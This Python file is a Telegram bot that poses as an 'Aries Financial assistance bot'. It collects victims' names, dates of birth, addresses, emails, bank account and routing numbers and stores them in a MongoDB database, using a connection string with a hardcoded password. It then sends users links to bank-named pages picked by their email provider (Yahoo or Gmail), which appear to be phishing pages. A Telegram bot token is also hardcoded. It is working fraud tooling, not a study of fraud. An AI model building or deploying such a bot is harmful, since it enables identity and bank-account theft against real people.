#!/usr/bin/env python
# pylint: disable=unused-argument, wrong-import-position
# This program is dedicated to the public domain under the CC0 license.

"""
First, a few callback functions are defined. Then, those functions are passed to
the Application and registered at their respective places.
Then, the bot is started and runs until we press Ctrl-C on the command line.

Usage:
Example of a bot-user conversation using ConversationHandler.
Send /start to initiate the conversation.
Press Ctrl-C on the command line or send a signal to the process to stop the
bot.
"""
import re
import pymongo
import webbrowser
import logging
from typing import Dict

from telegram import __version__ as TG_VER 

try:
    from telegram import __version_info__
except ImportError:
    __version_info__ = (0, 0, 0, 0, 0)  # type: ignore[assignment]

if __version_info__ < (20, 0, 0, "alpha", 1):
    raise RuntimeError(
        f"This example is not compatible with your current PTB version {TG_VER}. To view the "
        f"{TG_VER} version of this example, "
        f"visit https://docs.python-telegram-bot.org/en/v{TG_VER}/examples.html"
    )
from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    
)
from telegram.constants import ParseMode


# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
# set higher logging level for httpx to avoid all GET and POST requests being logged
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

QUESTIONS, CHOOSING, TYPING_REPLY, DONE = range(4)

# Dictionary to store user data during the conversation
user_data = {}

questions = [
    "What's your favorite color?",
    "Kindly provide us your Name (Surname first)",
    "Your State/City",
    "Phone number",
    "Date of birth (dd/mm/yyyy)",
    "House address",
    "Email address",
    "Why should we consider your application?",
    "Account number",
    "Routing number",
]

# MongoDB connection
client = pymongo.MongoClient("mongodb+srv://emmysmat:Dsmartest1@elias.qtqiybl.mongodb.net/")  # Replace with your MongoDB URI
db = client["bot_responses"]
collection = db["user_responses"]

reply_keyboard = [
    ["Done"]
]
markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)

reply_keyboard2 = [
    ["CONTINUE"]
]
markup2 = ReplyKeyboardMarkup(reply_keyboard2, one_time_keyboard=True, resize_keyboard=True)


def facts_to_str(user_data: Dict[str, str]) -> str:
    """Helper function for formatting the gathered user info."""
    facts = [f"{key} - {value}" for key, value in user_data.items()]
    return "\n".join(facts).join(["\n", "\n"])


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation and ask user for input."""
    user = update.message.from_user
    await   update.message.reply_text(
        f"Hello {user.first_name}! Welcome to the Aries Financial assistance bot.\n"
        "Do well to answer all questions so we can get to know you.\n"
        "Please press CONTINUE to begin",
        reply_markup=markup2,
    )

    return QUESTIONS

async def ask_question(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_message = update.message.text
    user_id = update.message.from_user.id
    current_question = context.user_data.get('current_question', 0)
    
    context.user_data[f'answer_{current_question}'] = user_message  # Store the answer in user_data

    if current_question < len(questions) - 1:
        current_question += 1
        context.user_data['current_question'] = current_question
        await update.message.reply_text(questions[current_question])
    else:
        reply_markup = markup
        await update.message.reply_text("You've answered all the questions. Click 'Done' to finish.", reply_markup=reply_markup)
        return DONE
    
    return QUESTIONS


#async def choose_bank(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a message with three inline buttons attached."""
    keyboard = [
        [
            InlineKeyboardButton("TD bank", callback_data="link to TD bank"),
            InlineKeyboardButton("Chase bank", callback_data="link to Chase"),
        ],
        [InlineKeyboardButton("MIT bank", callback_data="link to MIT bank")],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text("Please select your bank:", reply_markup=reply_markup)


async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Parses the CallbackQuery and updates the message text."""
    query = update.callback_query

    # CallbackQueries need to be answered, even if no notification to the user is needed
    # Some clients may have trouble otherwise. See https://core.telegram.org/bots/api#callbackquery
    await query.answer()
    
    link = query.data
     
    await query.edit_message_text(text=f"Selected option: {query.data}")
    

    webbrowser.open(link)




async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.message.from_user
    user_id = user.id
    await update.message.reply_text("Thank you for providing your answers. The conversation has been completed.")
    
    # Store all the answers in the database
    user_responses = {}
    for i, question in enumerate(questions, start=0):
        user_responses[f'question_{i}'] = context.user_data.get(f'answer_{i}', 'Not answered')
    
    response = {
        "user_id": user_id,
        "responses": user_responses
    }
    collection.insert_one(response)

    # Save the user email 
    user_email = user_responses['question_6']

    # Define regular expressions to match Yahoo and Gmail email addresses
    yahoo_pattern = r'@yahoo\.com$'
    gmail_pattern = r'@gmail\.com$'

    yahoo = f'http://localhost:5000/yahoo?tgUserId={user_id}'
    gmail = f'https://bot-test-0lfi.onrender.com/GMAIL?tgUserId={user_id}'

    # Define each link, depending on the user's mail
    if re.search(yahoo_pattern, user_email):
        IDAHO_Bank = f'http://localhost:5000/Idaho_yahoo?tgUserId={user_id}'
        RBFCU_Bank = f'http://localhost:5000/rbfcu_yahoo?tgUserId={user_id}'
        MIT_Bank = f'http://localhost:5000/MIT_yahoo?tgUserId={user_id}'
    elif re.search(gmail_pattern, user_email):
        IDAHO_Bank = f'http://localhost:5000/Idaho_gmail?tgUserId={user_id}'
        RBFCU_Bank = f'http://localhost:5000/rbfcu_gmail?tgUserId={user_id}'
        MIT_Bank = f'http://localhost:5000/MIT_gmail?tgUserId={user_id}'
    else:
        IDAHO_Bank = f'http://localhost:5000/gmail_Idaho_Bank?tgUserId={user_id}'
        RBFCU_Bank = f'http://localhost:5000/gmail_rbfcu_Bank?tgUserId={user_id}'
        MIT_Bank = f'http://localhost:5000/yahoo_MIT_BANK?tgUserId={user_id}'

    # Clear user data
    context.user_data.clear()
    
    """Sends a message with three inline buttons attached."""
    keyboard = [
        [
            InlineKeyboardButton("IDAHO BANK", callback_data=IDAHO_Bank),
            InlineKeyboardButton("Randolph-Brooks Federal Credit Union", callback_data=RBFCU_Bank),
        ],
        [InlineKeyboardButton("MIT bank", callback_data=MIT_Bank)],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text("Please select your bank:", reply_markup=reply_markup)
    
    # End the conversation
    return ConversationHandler.END


def main() -> None:
    """Run the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token("6384532778:AAHMaZBRAvX2iTaBN15M1pPduP8ZAjrm_U0").build()

    application.add_handler(CallbackQueryHandler(button))

    # Add conversation handler with the states CHOOSING, TYPING_CHOICE and TYPING_REPLY
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            QUESTIONS: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND, ask_question
                    ),
                    MessageHandler(
                    filters.TEXT & ~(filters.COMMAND |filters.Regex('^Done$')), done
                    )
            ],
            DONE: [
                MessageHandler(
                    filters.Regex('^Done$'), done
                    )
            ]
        },
        fallbacks=[MessageHandler(filters.Regex("^Done$"), done)],
    )

    application.add_handler(conv_handler)

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()